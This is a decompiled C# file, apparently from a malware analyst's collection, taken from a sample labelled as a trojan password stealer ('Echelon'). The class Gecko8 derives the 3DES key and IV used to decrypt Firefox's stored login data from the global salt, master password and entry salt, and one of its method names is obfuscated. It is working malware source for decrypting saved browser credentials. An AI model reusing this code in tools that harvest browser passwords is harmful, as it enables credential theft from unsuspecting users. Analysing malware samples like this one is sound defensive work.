// Decompiled with JetBrains decompiler
// Type: Echelon.Gecko8
// Assembly: Echelon, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DAEC4C03-F667-4BBB-B546-ED8351172E13
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-PSW.MSIL.Coins.gen-d5a7c67747c1d8095b6fb6fef9f446b048a753bfda98e9cf19f265a6203e27cf.exe

using System;
using System.Security.Cryptography;

namespace Echelon
{
  public class Gecko8
  {
    private byte[] _globalSalt { get; }

    private byte[] _masterPassword { get; }

    private byte[] _entrySalt { get; }

    public byte[] DataKey { get; private set; }

    public byte[] DataIV { get; private set; }

    public Gecko8(byte[] salt, byte[] password, byte[] entry)
    {
      this._globalSalt = salt;
      this._masterPassword = password;
      this._entrySalt = entry;
    }

    public void го7па()
    {
      SHA1CryptoServiceProvider cryptoServiceProvider = new SHA1CryptoServiceProvider();
      byte[] numArray1 = new byte[this._globalSalt.Length + this._masterPassword.Length];
      Array.Copy((Array) this._globalSalt, 0, (Array) numArray1, 0, this._globalSalt.Length);
      Array.Copy((Array) this._masterPassword, 0, (Array) numArray1, this._globalSalt.Length, this._masterPassword.Length);
      byte[] hash1 = cryptoServiceProvider.ComputeHash(numArray1);
      byte[] numArray2 = new byte[hash1.Length + this._entrySalt.Length];
      Array.Copy((Array) hash1, 0, (Array) numArray2, 0, hash1.Length);
      Array.Copy((Array) this._entrySalt, 0, (Array) numArray2, hash1.Length, this._entrySalt.Length);
      byte[] hash2 = cryptoServiceProvider.ComputeHash(numArray2);
      byte[] numArray3 = new byte[20];
      Array.Copy((Array) this._entrySalt, 0, (Array) numArray3, 0, this._entrySalt.Length);
      for (int length = this._entrySalt.Length; length < 20; ++length)
        numArray3[length] = (byte) 0;
      byte[] numArray4 = new byte[numArray3.Length + this._entrySalt.Length];
      Array.Copy((Array) numArray3, 0, (Array) numArray4, 0, numArray3.Length);
      Array.Copy((Array) this._entrySalt, 0, (Array) numArray4, numArray3.Length, this._entrySalt.Length);
      byte[] hash3;
      byte[] hash4;
      using (HMACSHA1 hmacshA1 = new HMACSHA1(hash2))
      {
        hash3 = hmacshA1.ComputeHash(numArray4);
        byte[] hash5 = hmacshA1.ComputeHash(numArray3);
        byte[] numArray5 = new byte[hash5.Length + this._entrySalt.Length];
        Array.Copy((Array) hash5, 0, (Array) numArray5, 0, hash5.Length);
        Array.Copy((Array) this._entrySalt, 0, (Array) numArray5, hash5.Length, this._entrySalt.Length);
        hash4 = hmacshA1.ComputeHash(numArray5);
      }
      byte[] destinationArray = new byte[hash3.Length + hash4.Length];
      Array.Copy((Array) hash3, 0, (Array) destinationArray, 0, hash3.Length);
      Array.Copy((Array) hash4, 0, (Array) destinationArray, hash3.Length, hash4.Length);
      this.DataKey = new byte[24];
      for (int index = 0; index < this.DataKey.Length; ++index)
        this.DataKey[index] = destinationArray[index];
      this.DataIV = new byte[8];
      int index1 = this.DataIV.Length - 1;
      for (int index2 = destinationArray.Length - 1; index2 >= destinationArray.Length - this.DataIV.Length; --index2)
      {
        this.DataIV[index1] = destinationArray[index2];
        --index1;
      }
    }
  }
}
